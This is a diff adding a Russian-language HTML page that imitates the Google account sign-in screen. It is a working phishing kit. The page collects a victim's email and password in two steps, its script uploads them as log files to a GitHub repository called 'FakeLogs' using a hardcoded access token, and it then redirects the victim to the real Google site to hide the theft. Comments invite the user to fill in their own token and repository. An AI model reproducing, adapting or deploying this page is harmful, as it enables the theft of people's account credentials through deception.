@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход в аккаунты Google</title>
+    <link rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/googleg_32dp.png">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Roboto', 'Arial', sans-serif;
+            background-color: #f0f4f9;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: #202124;
+        }
+        header { padding: 16px 24px; display: flex; justify-content: center; }
+        .logo { font-size: 24px; font-weight: 500; letter-spacing: -0.5px; }
+        .logo span:nth-child(1) { color: #4285f4; }
+        .logo span:nth-child(2) { color: #ea4335; }
+        .logo span:nth-child(3) { color: #fbbc04; }
+        .logo span:nth-child(4) { color: #4285f4; }
+        .logo span:nth-child(5) { color: #34a853; }
+        .logo span:nth-child(6) { color: #ea4335; }
+        
+        main { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .login-card {
+            background: #fff;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            width: 100%;
+            max-width: 448px;
+            text-align: center;
+        }
+        .login-card h2 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+        .login-card p { font-size: 16px; margin-bottom: 30px; }
+        .input-group { position: relative; margin-bottom: 20px; text-align: left; }
+        .input-group input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: border 0.2s;
+        }
+        .input-group input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: -8px; left: 10px; font-size: 12px; background: #fff; padding: 0 4px; color: #1a73e8;
+        }
+        .input-group label {
+            position: absolute; top: 14px; left: 15px; font-size: 16px; color: #5f6368;
+            pointer-events: none; transition: 0.2s;
+        }
+        .links { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; font-size: 14px; }
+        .links a { color: #1a73e8; text-decoration: none; font-weight: 500; }
+        .links a:hover { text-decoration: underline; }
+        .btn-container { display: flex; justify-content: flex-end; margin-top: 20px; }
+        .btn-next {
+            background: #1a73e8; color: white; border: none; padding: 10px 24px;
+            font-size: 14px; font-weight: 500; border-radius: 4px; cursor: pointer;
+        }
+        .btn-next:hover { background: #1557b0; }
+        footer {
+            display: flex; justify-content: space-between; padding: 24px;
+            font-size: 12px; color: #5f6368; max-width: 1200px; margin: 0 auto; width: 100%;
+        }
+        footer select { border: none; background: transparent; color: #5f6368; font-size: 12px; cursor: pointer; }
+        .footer-links a { color: #5f6368; text-decoration: none; margin-left: 20px; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+        </div>
+    </header>
+
+    <main>
+        <div class="login-card">
+            <h2>Вход</h2>
+            <p>Используйте аккаунт Google</p>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="email" id="emailInput" placeholder=" " required>
+                    <label for="emailInput">Электронная почта или телефон</label>
+                </div>
+                
+                <div class="input-group" id="passwordGroup" style="display: none;">
+                    <input type="password" id="passInput" placeholder=" " required>
+                    <label for="passInput">Введите пароль</label>
+                </div>
+
+                <div class="links">
+                    <a href="#">Забыли адрес электронной почты?</a>
+                </div>
+
+                <div class="btn-container">
+                    <button type="submit" class="btn-next" id="btnNext">Далее</button>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <footer>
+        <div>
+            <select><option>Русский</option><option>English</option></select>
+        </div>
+        <div class="footer-links">
+            <a href="#">Помощь</a>
+            <a href="#">Конфиденциальность</a>
+            <a href="#">Условия</a>
+        </div>
+    </footer>
+
+    <script>
+        // ==========================================
+        // НАСТРОЙКИ (ВСТАВЬ СВОИ ДАННЫЕ)
+        // ==========================================
+        const GH_TOKEN = "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"; 
+        const REPO_OWNER = "jgjjj0927-hub"; // Твой ник
+        const REPO_NAME = "FakeLogs";       // Название репозитория для логов
+        // ==========================================
+
+        let step = 1;
+        let emailVal = "";
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            if (step === 1) {
+                // Шаг 1: Ввод почты
+                emailVal = document.getElementById('emailInput').value;
+                if (!emailVal) return;
+                
+                document.getElementById('passwordGroup').style.display = 'block';
+                document.getElementById('emailInput').readOnly = true;
+                document.getElementById('btnNext').innerText = "Войти";
+                step = 2;
+            } else if (step === 2) {
+                // Шаг 2: Ввод пароля
+                const passVal = document.getElementById('passInput').value;
+                if (!passVal) return;
+                
+                sendToGitHub(emailVal, passVal);
+            }
+        });
+
+        function sendToGitHub(email, pass) {
+            const date = new Date().toISOString().replace(/[:.]/g, '-');
+            const fileName = `log_${date}.txt`;
+            const content = `Логин: ${email}\nПароль: ${pass}\nДата: ${new Date().toLocaleString()}`;
+            
+            // Кодируем в base64
+            const base64Content = btoa(unescape(encodeURIComponent(content)));
+
+            const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${fileName}`;
+            
+            fetch(url, {
+                method: 'PUT',
+                headers: {
+                    'Authorization': `token ${GH_TOKEN}`,
+                    'Accept': 'application/vnd.github.v3+json',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    message: `New log`,
+                    content: base64Content
+                })
+            }).finally(() => {
+                // В любом случае перекидываем на настоящий Google
+                window.location.href = "https://accounts.google.com";
+            });
+        }
+    </script>
+</body>
+</html>
